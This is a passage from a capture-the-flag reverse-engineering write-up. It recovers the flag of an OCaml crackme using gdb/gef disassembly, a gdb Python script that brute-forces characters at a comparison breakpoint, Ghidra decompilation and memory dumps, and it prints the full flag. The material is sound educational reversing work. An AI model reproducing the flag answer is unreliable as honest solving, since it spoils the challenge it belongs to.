&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>gef source extract_start.py
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span>Inferior &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#f92672">(&lt;/span>process 1287983&lt;span style="color:#f92672">)&lt;/span> exited normally&lt;span style="color:#f92672">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">=&lt;/span>&amp;gt; CYBERTF&lt;span style="color:#f92672">{&lt;/span>Go
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>After a few seconds, we get the start of the flag: &lt;code>CYBERTF{Go&lt;/code>. Now let&amp;rsquo;s look at the other function. We&amp;rsquo;ll assume it checks the remaining part of the flag.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>gef disassemble camlReverse__listequal_92
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Dump of assembler code &lt;span style="color:#66d9ef">for&lt;/span> &lt;span style="color:#66d9ef">function&lt;/span> camlReverse__listequal_92:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x0000555555573e20 &amp;lt;+0&amp;gt;: sub rsp,0x18
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x0000555555573e24 &amp;lt;+4&amp;gt;: cmp rax,0x1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x0000555555573e28 &amp;lt;+8&amp;gt;: je 0x555555573e74 &amp;lt;camlReverse__listequal_92+84&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x0000555555573e2a &amp;lt;+10&amp;gt;: cmp rbx,0x1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x0000555555573e2e &amp;lt;+14&amp;gt;: je 0x555555573e84 &amp;lt;camlReverse__listequal_92+100&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x0000555555573e30 &amp;lt;+16&amp;gt;: mov QWORD PTR &lt;span style="color:#f92672">[&lt;/span>rsp&lt;span style="color:#f92672">]&lt;/span>,rbx
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x0000555555573e34 &amp;lt;+20&amp;gt;: mov QWORD PTR &lt;span style="color:#f92672">[&lt;/span>rsp+0x8&lt;span style="color:#f92672">]&lt;/span>,rax
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x0000555555573e39 &amp;lt;+25&amp;gt;: mov rsi,QWORD PTR &lt;span style="color:#f92672">[&lt;/span>rbx&lt;span style="color:#f92672">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x0000555555573e3c &amp;lt;+28&amp;gt;: mov rdi,QWORD PTR &lt;span style="color:#f92672">[&lt;/span>rax&lt;span style="color:#f92672">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x0000555555573e3f &amp;lt;+31&amp;gt;: lea rax,&lt;span style="color:#f92672">[&lt;/span>rip+0x11d0a&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#75715e"># 0x555555585b50 &amp;lt;caml_equal&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x0000555555573e46 &amp;lt;+38&amp;gt;: call 0x55555559b81c &amp;lt;caml_c_call&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x0000555555573e4b &amp;lt;+43&amp;gt;: mov r15,QWORD PTR &lt;span style="color:#f92672">[&lt;/span>r14&lt;span style="color:#f92672">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x0000555555573e4e &amp;lt;+46&amp;gt;: cmp rax,0x1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x0000555555573e52 &amp;lt;+50&amp;gt;: je 0x555555573e68 &amp;lt;camlReverse__listequal_92+72&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x0000555555573e54 &amp;lt;+52&amp;gt;: mov rax,QWORD PTR &lt;span style="color:#f92672">[&lt;/span>rsp&lt;span style="color:#f92672">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x0000555555573e58 &amp;lt;+56&amp;gt;: mov rbx,QWORD PTR &lt;span style="color:#f92672">[&lt;/span>rax+0x8&lt;span style="color:#f92672">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x0000555555573e5c &amp;lt;+60&amp;gt;: mov rax,QWORD PTR &lt;span style="color:#f92672">[&lt;/span>rsp+0x8&lt;span style="color:#f92672">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x0000555555573e61 &amp;lt;+65&amp;gt;: mov rax,QWORD PTR &lt;span style="color:#f92672">[&lt;/span>rax+0x8&lt;span style="color:#f92672">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x0000555555573e65 &amp;lt;+69&amp;gt;: jmp 0x555555573e24 &amp;lt;camlReverse__listequal_92+4&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x0000555555573e67 &amp;lt;+71&amp;gt;: nop
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x0000555555573e68 &amp;lt;+72&amp;gt;: mov eax,0x1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x0000555555573e6d &amp;lt;+77&amp;gt;: add rsp,0x18
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x0000555555573e71 &amp;lt;+81&amp;gt;: ret
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x0000555555573e72 &amp;lt;+82&amp;gt;: xchg ax,ax
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x0000555555573e74 &amp;lt;+84&amp;gt;: cmp rbx,0x1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x0000555555573e78 &amp;lt;+88&amp;gt;: jne 0x555555573e84 &amp;lt;camlReverse__listequal_92+100&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x0000555555573e7a &amp;lt;+90&amp;gt;: mov eax,0x3
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x0000555555573e7f &amp;lt;+95&amp;gt;: add rsp,0x18
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x0000555555573e83 &amp;lt;+99&amp;gt;: ret
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x0000555555573e84 &amp;lt;+100&amp;gt;: mov eax,0x1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x0000555555573e89 &amp;lt;+105&amp;gt;: add rsp,0x18
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 0x0000555555573e8d &amp;lt;+109&amp;gt;: ret
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>End of assembler dump.
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>We have the same pattern here, let&amp;rsquo;s just quickly adapt the script.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> string
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>alphabet &lt;span style="color:#f92672">=&lt;/span> (
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#39;_&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> string&lt;span style="color:#f92672">.&lt;/span>ascii_lowercase &lt;span style="color:#f92672">+&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> string&lt;span style="color:#f92672">.&lt;/span>ascii_uppercase &lt;span style="color:#f92672">+&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> string&lt;span style="color:#f92672">.&lt;/span>digits &lt;span style="color:#f92672">+&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> string&lt;span style="color:#f92672">.&lt;/span>punctuation
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>found &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;CYBERTF{Go&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>start_len &lt;span style="color:#f92672">=&lt;/span> len(found)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>running &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">True&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">while&lt;/span> running:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> char &lt;span style="color:#f92672">in&lt;/span> alphabet:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># To avoid substitution errors, skip &amp;#39;.&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> char &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#39;&amp;#34;&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">continue&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(found &lt;span style="color:#f92672">+&lt;/span> char)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># Run the program.&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> gdb&lt;span style="color:#f92672">.&lt;/span>execute(&lt;span style="color:#e6db74">&amp;#34;r &amp;#39;&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> found &lt;span style="color:#f92672">+&lt;/span> char &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#39;&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># Skip over the first N chars we already found.&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> len(found) &lt;span style="color:#f92672">-&lt;/span> start_len &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> gdb&lt;span style="color:#f92672">.&lt;/span>execute(&lt;span style="color:#e6db74">&amp;#39;continue &amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> str(len(found) &lt;span style="color:#f92672">-&lt;/span> start_len))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># Get the values of the registers.&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">try&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> rdi &lt;span style="color:#f92672">=&lt;/span> int(gdb&lt;span style="color:#f92672">.&lt;/span>parse_and_eval(&lt;span style="color:#e6db74">&amp;#34;$rdi&amp;#34;&lt;/span>))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> rsi &lt;span style="color:#f92672">=&lt;/span> int(gdb&lt;span style="color:#f92672">.&lt;/span>parse_and_eval(&lt;span style="color:#e6db74">&amp;#34;$rsi&amp;#34;&lt;/span>))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">except&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> running &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">False&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">break&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> rdi &lt;span style="color:#f92672">==&lt;/span> rsi:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> found &lt;span style="color:#f92672">+=&lt;/span> char
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">break&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">break&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(&lt;span style="color:#e6db74">&amp;#39;=&amp;gt;&amp;#39;&lt;/span>, found)
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>gef &lt;span style="color:#75715e"># Remove the previous breakpoint first.&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>gef del &lt;span style="color:#ae81ff">1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>gef d *0x0000555555573e46
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Breakpoint &lt;span style="color:#ae81ff">2&lt;/span> at 0x555555573e46
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>gef source extract_end.py
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span>Inferior &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#f92672">(&lt;/span>process 1294818&lt;span style="color:#f92672">)&lt;/span> exited normally&lt;span style="color:#f92672">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">=&lt;/span>&amp;gt; CYBERTF&lt;span style="color:#f92672">{&lt;/span>Golang_is_D3@d_1n_CTF_1795b4a89708371d16982195642638cd7783998188&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Here is the flag: &lt;code>CYBERTF{Golang_is_D3@d_1n_CTF_1795b4a89708371d16982195642638cd7783998188}&lt;/code>.&lt;/p>
&lt;p>It took around 4 minutes for it to finish.&lt;/p>
&lt;h2 id="additional-notes">Additional notes&lt;/h2>
&lt;p>I&amp;rsquo;ve been wanting to learn about Ghidra&amp;rsquo;s python API for a while now, so I decided after writing the post above to take a deeper look at how things are implemented, and to write a script that&amp;rsquo;ll extract the flag.&lt;/p>
&lt;p>Let&amp;rsquo;s first check out &lt;code>camlReverse__string2char_211&lt;/code>, by breaking right before it is called.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ gdb ./program
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>gef &lt;span style="color:#75715e"># Break right before camlReverse__string2char_211 is called.&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>gef b *0x0000555555574278
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>gef r ABCDEFG
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>gef &lt;span style="color:#75715e"># The argument is loaded into rax, printing it reveals our flag (ABCDEFG).&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>gef x/2x $rax
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x7ffff7c7ffa8: 0x44434241 0x00474645
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>gef &lt;span style="color:#75715e"># Now let&amp;#39;s run the function.&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>gef stepi
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>gef next
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>gef next
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>gef &lt;span style="color:#75715e"># When we&amp;#39;re back into main, we see that the structure changed quite a bit.&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>gef x/2x $rax
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x7ffff7c7fd30: 0x00000083 0x00000000
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Looking at the function in Ghidra, it seems recursive:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">camlReverse__string2char_211&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">long&lt;/span> in_RAX;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> camlReverse__string2char_tmp_214
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> (&lt;span style="color:#ae81ff">1&lt;/span>,&lt;span style="color:#f92672">*&lt;/span>(undefined &lt;span style="color:#f92672">*&lt;/span>)(in_RAX &lt;span style="color:#f92672">+&lt;/span> (&lt;span style="color:#f92672">*&lt;/span>(ulong &lt;span style="color:#f92672">*&lt;/span>)(in_RAX &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">8&lt;/span>) &lt;span style="color:#f92672">&amp;gt;&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">10&lt;/span>) &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">long&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#a6e22e">camlReverse__string2char_tmp_214&lt;/span>(&lt;span style="color:#66d9ef">long&lt;/span> param_1) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">long&lt;/span> lVar1;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">long&lt;/span> in_RAX;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> undefined8 uVar2;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">long&lt;/span> unaff_RBX;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">long&lt;/span> unaff_R14;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">long&lt;/span> unaff_R15;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (param_1 &lt;span style="color:#f92672">==&lt;/span> unaff_RBX) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> (&lt;span style="color:#66d9ef">long&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)&lt;span style="color:#ae81ff">0x1&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> uVar2 &lt;span style="color:#f92672">=&lt;/span> camlReverse__string2char_tmp_214(param_1 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (unaff_R15 &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">0x18U&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#f92672">*&lt;/span>(ulong &lt;span style="color:#f92672">*&lt;/span>)(unaff_R14 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span>)) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> uVar2 &lt;span style="color:#f92672">=&lt;/span> caml_call_gc();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>(undefined8 &lt;span style="color:#f92672">*&lt;/span>)(unaff_R15 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">0x18&lt;/span>) &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x800&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> lVar1 &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#f92672">*&lt;/span>(ulong &lt;span style="color:#f92672">*&lt;/span>)(in_RAX &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">8&lt;/span>) &lt;span style="color:#f92672">&amp;gt;&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">10&lt;/span>) &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">8&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ((ulong)(param_1 &lt;span style="color:#f92672">&amp;gt;&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>) &lt;span style="color:#f92672">&amp;lt;&lt;/span> lVar1 &lt;span style="color:#f92672">-&lt;/span> (ulong)&lt;span style="color:#f92672">*&lt;/span>(byte &lt;span style="color:#f92672">*&lt;/span>)(in_RAX &lt;span style="color:#f92672">+&lt;/span> lVar1)) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>(&lt;span style="color:#66d9ef">long&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)(unaff_R15 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">0x10&lt;/span>) &lt;span style="color:#f92672">=&lt;/span> (ulong)&lt;span style="color:#f92672">*&lt;/span>(byte &lt;span style="color:#f92672">*&lt;/span>)(in_RAX &lt;span style="color:#f92672">+&lt;/span> (param_1 &lt;span style="color:#f92672">&amp;gt;&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>)) &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">*&lt;/span>(undefined8 &lt;span style="color:#f92672">*&lt;/span>)(unaff_R15 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">8&lt;/span>) &lt;span style="color:#f92672">=&lt;/span> uVar2;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> (&lt;span style="color:#66d9ef">long&lt;/span> &lt;span style="color:#f92672">*&lt;/span>)(unaff_R15 &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">0x10&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">/* WARNING: Subroutine does not return */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> caml_ml_array_bound_error();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>The most interesting part is the &lt;code>* 2 + 1&lt;/code> operation. Our &lt;code>0x83&lt;/code> value really is &lt;code>0x41 * 2 + 1&lt;/code>. If we show a bit more of the memory, we can find the other chars:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>gef x/64x $rax
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x7ffff7c7fd30: 0x00000083 0x00000000 0xf7c7fd48 0x00007fff
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x7ffff7c7fd40: 0x00000800 0x00000000 0x00000085 0x00000000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x7ffff7c7fd50: 0xf7c7fd60 0x00007fff 0x00000800 0x00000000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x7ffff7c7fd60: 0x00000087 0x00000000 0xf7c7fd78 0x00007fff
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x7ffff7c7fd70: 0x00000800 0x00000000 0x00000089 0x00000000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x7ffff7c7fd80: 0xf7c7fd90 0x00007fff 0x00000800 0x00000000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x7ffff7c7fd90: 0x0000008b 0x00000000 0xf7c7fda8 0x00007fff
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x7ffff7c7fda0: 0x00000800 0x00000000 0x0000008d 0x00000000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x7ffff7c7fdb0: 0xf7c7fdc0 0x00007fff 0x00000800 0x00000000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x7ffff7c7fdc0: 0x0000008f 0x00000000 0x00000001 0x00000000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x7ffff7c7fdd0: 0x000004fc 0x00000000 0x00000000 0x07000000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x7ffff7c7fde0: 0x00000400 0x00000000 0x555b8960 0x00005555
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x7ffff7c7fdf0: 0x000008f8 0x00000000 0x555b8b60 0x00005555
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x7ffff7c7fe00: 0x00000003 0x00000000 0x00000400 0x00000000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x7ffff7c7fe10: 0x00000001 0x00000000 0x00000c00 0x00000000
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x7ffff7c7fe20: 0xf7c7fe40 0x00007fff 0x00000081 0x00000000
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>We have &lt;code>0x83, 0x85, 0x87, ...&lt;/code>. This maps to our input, meaning we can get the start of the flag by decoding these values.&lt;/p>
&lt;p>Also, we notice that each value has a pointer to the next one, meaning this is a linked list. We can build a first script to decode the start of the flag:&lt;/p>
